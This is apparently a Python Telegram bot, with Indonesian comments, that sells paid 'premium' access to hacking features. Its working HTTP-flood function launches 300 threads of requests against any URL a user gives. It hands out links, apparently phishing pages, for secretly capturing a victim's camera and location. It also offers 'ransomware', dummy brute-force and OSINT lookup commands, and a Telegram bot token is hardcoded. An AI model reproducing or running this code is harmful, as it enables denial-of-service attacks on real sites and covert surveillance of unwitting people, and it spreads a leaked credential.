import telebot
import threading
import time
import requests
import random
import urllib.parse
import os

# Token dan Setting
TOKEN = "7939125410:AAHyjkU2NJa33Bkcuzb3_8KoxviSzEkmeRg"
GROUP_ID = -1002502923263
ADMIN_ID = 7819779147
OPENAI_API_KEY = "ISI_API_KEY_KAMU"  # Ganti dengan API KEY baru kamu
premium_users = [ADMIN_ID]
message_ids = []
message_times = {}

bot = telebot.TeleBot(TOKEN)

# Auto delete message
def auto_delete():
    while True:
        time.sleep(10)
        current_time = time.time()
        for msg_id in message_ids[:]:
            if current_time - message_times.get(msg_id, current_time) >= 60:
                try:
                    bot.delete_message(GROUP_ID, msg_id)
                    message_ids.remove(msg_id)
                    message_times.pop(msg_id, None)
                except:
                    continue

threading.Thread(target=auto_delete, daemon=True).start()

# List User-Agents buat flood
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64)",
]

# DDoS HTTP Flood Function
def http_flood(url, times):
    def attack():
        for _ in range(times):
            try:
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Referer": url,
                }
                requests.get(url, headers=headers, timeout=5)
            except:
                pass
    for _ in range(300):
        threading.Thread(target=attack).start()

# Bruteforce Dummy Function
def bruteforce_attack(target):
    for i in range(5):
        time.sleep(1)
        print(f"[*] Mencoba password ke-{i+1} untuk {target}")

# OSINT Pencarian Sosial Media
def search_osin(name):
    urls = [
        f"https://www.instagram.com/{name}",
        f"https://www.facebook.com/{name}",
        f"https://twitter.com/{name}",
        f"https://tiktok.com/@{name}",
        f"https://github.com/{name}",
        f"https://linkedin.com/in/{name}",
    ]
    hasil = "\n".join(urls)
    return f"Hasil pencarian sosial media untuk {name}:\n\n{hasil}"

# Command Bot
@bot.message_handler(commands=['start'])
def start(message):
    try:
        with open('/storage/emulated/0/DCIM/cj.jpg', 'rb') as photo:
            bot.send_photo(message.chat.id, photo, caption="Selamat datang!\n\nFITUR:\n/hackcamera\n/lacaklokasi\n/addprem\n/ddos\n/bruteforce\n/Osin\n/crate_ransomware\n/openai\n\nMinta akses premium ke: @NikoCyber_CJ")
    except Exception as e:
        bot.reply_to(message, f"Gagal kirim foto: {e}")

@bot.message_handler(commands=['fitur'])
def fitur(message):
    if message.from_user.id in premium_users:
        bot.reply_to(message, "/hackcamera\n/lacaklokasi\n/addprem\n/ddos\n/bruteforce\n/Osin\n/crate_ransomware\n/openai")
    else:
        bot.reply_to(message, "Akses ditolak.\nMinta premium ke @NikoCyber_CJ")

@bot.message_handler(commands=['Osin'])
def osin(message):
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "Penggunaan: /Osin <nama_pengguna>")
            return
        name = args[1]
        result = search_osin(name)
        bot.reply_to(message, result)
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['hackcamera'])
def hackcamera(message):
    if message.from_user.id in premium_users:
        try:
            with open('/storage/emulated/0/DCIM/cj.jpg', 'rb') as photo:
                msg = bot.send_photo(GROUP_ID, photo, caption=
                    "Link Kamera: https://rad-nasturtium-d1b416.netlify.app/\n\n"
                    "Salin link ini dan kirimkan ke target.\n"
                    "Untuk lihat hasilnya, hubungi admin: @NikoCyber_CJ"
                )
                message_ids.append(msg.message_id)
                message_times[msg.message_id] = time.time()
        except Exception as e:
            bot.reply_to(message, f"Gagal kirim foto: {e}")
    else:
        bot.reply_to(message, "Akses ditolak.")

@bot.message_handler(commands=['lacaklokasi'])
def lacaklokasi(message):
    if message.from_user.id in premium_users:
        try:
            with open('/storage/emulated/0/DCIM/cj.jpg', 'rb') as photo:
                msg = bot.send_photo(GROUP_ID, photo, caption=
                    "Link Lokasi: https://dazzling-entremet-5e8a20.netlify.app/\n\n"
                    "Salin link ini dan kirimkan ke target.\n"
                    "Untuk lihat lokasi, hubungi admin: @NikoCyber_CJ"
                )
                message_ids.append(msg.message_id)
                message_times[msg.message_id] = time.time()
        except Exception as e:
            bot.reply_to(message, f"Gagal kirim foto: {e}")
    else:
        bot.reply_to(message, "Akses ditolak.")

@bot.message_handler(commands=['addprem'])
def addprem(message):
    try:
        with open('/storage/emulated/0/DCIM/QR.jpg', 'rb') as photo:
            msg = bot.send_photo(message.chat.id, photo, caption=
                "Akses Premium\n\nBiaya: Rp 20.000\nScan QR untuk bayar.\nHubungi: @NikoCyber_CJ"
            )
            message_ids.append(msg.message_id)
            message_times[msg.message_id] = time.time()
    except Exception as e:
        bot.reply_to(message, f"Gagal kirim QR: {e}")

@bot.message_handler(commands=['ddos'])
def ddos_command(message):
    if message.from_user.id in premium_users:
        try:
            args = message.text.split()
            if len(args) < 3:
                bot.reply_to(message, "Penggunaan: /ddos <url> <durasi_detik>")
                return
            url = args[1]
            duration = int(args[2])
            bot.reply_to(message, f"Mulai DDoS {url} selama {duration} detik...")
            threading.Thread(target=http_flood, args=(url, duration)).start()
        except Exception as e:
            bot.reply_to(message, f"Error: {e}")
    else:
        bot.reply_to(message, "Akses ditolak.")

@bot.message_handler(commands=['bruteforce'])
def bruteforce_command(message):
    if message.from_user.id in premium_users:
        try:
            args = message.text.split()
            if len(args) < 2:
                bot.reply_to(message, "Penggunaan: /bruteforce <target_url>")
                return
            target_url = args[1]
            bot.reply_to(message, f"Memulai bruteforce ke {target_url}...")
            threading.Thread(target=bruteforce_attack, args=(target_url,)).start()
        except Exception as e:
            bot.reply_to(message, f"Error: {e}")
    else:
        bot.reply_to(message, "Akses ditolak.")

@bot.message_handler(commands=['crate_ransomware'])
def crate_ransomware(message):
    if message.from_user.id in premium_users:
        try:
            with open('/storage/emulated/0/DCIM/ransomware.png', 'rb') as file:
                bot.send_document(message.chat.id, file, caption="Berhasil membuat ransomware dummy!")
        except Exception as e:
            bot.reply_to(message, f"Gagal kirim ransomware: {e}")
    else:
        bot.reply_to(message, "Akses ditolak.")

@bot.message_handler(commands=['openai'])
def openai_chat(message):
    if message.from_user.id in premium_users:
        try:
            prompt = message.text.replace('/openai', '').strip()
            if not prompt:
                bot.reply_to(message, "Penggunaan: /openai <pertanyaan>")
                return
            headers = {
                "Authorization": f"Bearer {OPENAI_API_KEY}",
                "Content-Type": "application/json"
            }
            payload = {
                "model": "gpt-3.5-turbo",
                "messages": [{"role": "user", "content": prompt}]
            }
            response = requests.post("https://api.openai.com/v1/chat/completions", json=payload, headers=headers)
            data = response.json()
            reply = data['choices'][0]['message']['content']
            bot.reply_to(message, reply)
        except Exception as e:
            bot.reply_to(message, f"Error OpenAI: {e}")
    else:
        bot.reply_to(message, "Akses ditolak.")

# Start Bot
print("Bot berjalan...")
bot.polling(non_stop=True)